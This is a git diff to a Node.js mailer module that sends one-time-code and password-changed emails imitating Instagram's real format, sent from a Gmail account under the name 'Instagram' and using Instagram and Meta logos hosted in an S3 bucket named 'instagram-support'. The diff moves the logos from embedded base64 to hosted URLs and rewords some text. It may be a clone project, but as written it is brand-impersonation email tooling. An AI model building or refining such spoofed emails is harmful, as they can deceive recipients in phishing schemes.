@@ -1,6 +1,4 @@
 const nodemailer = require('nodemailer');
-const fs = require('fs');
-const path = require('path');
 
 /** Lazily-created singleton transporter. */
 let _transporter = null;
@@ -19,27 +17,20 @@ function getTransporter() {
   return _transporter;
 }
 
+// S3 hosted logo URLs
+const INSTA_LOGO_URL = 'https://instagram-support.s3.ap-south-1.amazonaws.com/insta-email-logo.png';
+const META_LOGO_URL = 'https://instagram-support.s3.ap-south-1.amazonaws.com/meta-email-logo.png';
+
 /**
  * Send a 6-digit OTP email matching Instagram's real confirmation email format.
- * Embeds images as base64 data URLs for maximum compatibility.
+ * Uses external S3 URLs for images.
  * @param {string} to   Recipient email address
  * @param {string} otp  6-digit code
  */
 async function sendOtpEmail(to, otp) {
   const transporter = getTransporter();
 
-  // Resolve absolute paths to image assets
-  const assetsPath = path.join(__dirname, '..', 'assets');
-  const instaLogoPath = path.join(assetsPath, 'insta-email-logo.png');
-  const metaLogoPath = path.join(assetsPath, 'meta-email-logo.png');
-
-  // Read images and convert to base64
-  const instaLogoBase64 = fs.readFileSync(instaLogoPath).toString('base64');
-  const metaLogoBase64 = fs.readFileSync(metaLogoPath).toString('base64');
-
-  console.log('� Preparing email for:', to);
-  console.log('✅ Instagram logo loaded:', instaLogoBase64.length, 'chars (base64)');
-  console.log('✅ Meta logo loaded:', metaLogoBase64.length, 'chars (base64)');
+  console.log('📧 Preparing OTP email for:', to);
 
   const html = `<!DOCTYPE html>
 <html lang="en">
@@ -73,7 +64,7 @@ async function sendOtpEmail(to, otp) {
           <tr>
             <td align="center" style="padding:0 24px 28px;">
               <img
-                src="data:image/png;base64,${instaLogoBase64}"
+                src="${INSTA_LOGO_URL}"
                 alt="Instagram"
                 width="197" height="40"
                 style="display:block;border:0;outline:none;max-width:100%;height:auto;" />
@@ -92,7 +83,7 @@ async function sendOtpEmail(to, otp) {
             <td style="padding:0 24px 24px;
                        font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                        font-size:18px!important;font-weight:500;color:#565a5c;line-height:1.7;">
-              This is your reset password OTP for Instagram account
+              This is your forgot password OTP for Instagram account
               <a href="mailto:${to}" style="color:#385898;text-decoration:none;font-weight:500;font-size:18px!important;">${to}</a>.
               If it was you, enter this confirmation code in the app:
             </td>
@@ -132,7 +123,7 @@ async function sendOtpEmail(to, otp) {
           <tr>
             <td align="center" style="padding:0 24px 16px;">
               <img
-                src="data:image/png;base64,${metaLogoBase64}"
+                src="${META_LOGO_URL}"
                 alt="Meta"
                 width="67" height="22"
                 style="display:block;margin:0 auto;border:0;outline:none;max-width:100%;height:auto;" />
@@ -172,7 +163,7 @@ async function sendOtpEmail(to, otp) {
 </body>
 </html>`;
 
-  const text = `Hi,\n\nThis is your reset password OTP for Instagram account ${to}. If it was you, enter this confirmation code in the app:\n\n${otp}\n\n© Instagram. Meta Platforms, Inc. · 1601 Willow Road, Menlo Park, CA 94025\nThis message was sent to ${to}`;
+  const text = `Hi,\n\nThis is your forgot password OTP for Instagram account ${to}. If it was you, enter this confirmation code in the app:\n\n${otp}\n\n© Instagram. Meta Platforms, Inc. · 1601 Willow Road, Menlo Park, CA 94025\nThis message was sent to ${to}`;
 
   const mailOptions = {
     from: `"Instagram" <${process.env.GMAIL_ID}>`,
@@ -182,11 +173,11 @@ async function sendOtpEmail(to, otp) {
     text,
   };
 
-  console.log('📤 Sending email with embedded base64 images...');
+  console.log('📤 Sending OTP email...');
   
   try {
     const info = await transporter.sendMail(mailOptions);
-    console.log('✅ Email sent successfully');
+    console.log('✅ OTP email sent successfully');
     console.log('   Message ID:', info.messageId);
     console.log('   Response:', info.response);
     return info;
@@ -198,21 +189,12 @@ async function sendOtpEmail(to, otp) {
 
 /**
  * Send password changed confirmation email matching Instagram's format.
+ * Uses external S3 URLs for images.
  * @param {string} to         Recipient email address
  * @param {string} username   Username (optional, will use email if not provided)
  */
 async function sendPasswordChangedEmail(to, username = '') {
   const transporter = getTransporter();
-
-  // Resolve absolute paths to image assets
-  const assetsPath = path.join(__dirname, '..', 'assets');
-  const instaLogoPath = path.join(assetsPath, 'insta-email-logo.png');
-  const metaLogoPath = path.join(assetsPath, 'meta-email-logo.png');
-
-  // Read images and convert to base64
-  const instaLogoBase64 = fs.readFileSync(instaLogoPath).toString('base64');
-  const metaLogoBase64 = fs.readFileSync(metaLogoPath).toString('base64');
-
   const displayName = username || to;
 
   console.log('🔒 Preparing password change confirmation email for:', to);
@@ -249,7 +231,7 @@ async function sendPasswordChangedEmail(to, username = '') {
           <tr>
             <td align="center" style="padding:0 24px 28px;">
               <img
-                src="data:image/png;base64,${instaLogoBase64}"
+                src="${INSTA_LOGO_URL}"
                 alt="Instagram"
                 width="197" height="40"
                 style="display:block;border:0;outline:none;max-width:100%;height:auto;" />
@@ -306,7 +288,7 @@ async function sendPasswordChangedEmail(to, username = '') {
           <tr>
             <td align="center" style="padding:0 24px 16px;">
               <img
-                src="data:image/png;base64,${metaLogoBase64}"
+                src="${META_LOGO_URL}"
                 alt="Meta"
                 width="67" height="22"
                 style="display:block;margin:0 auto;border:0;outline:none;max-width:100%;height:auto;" />
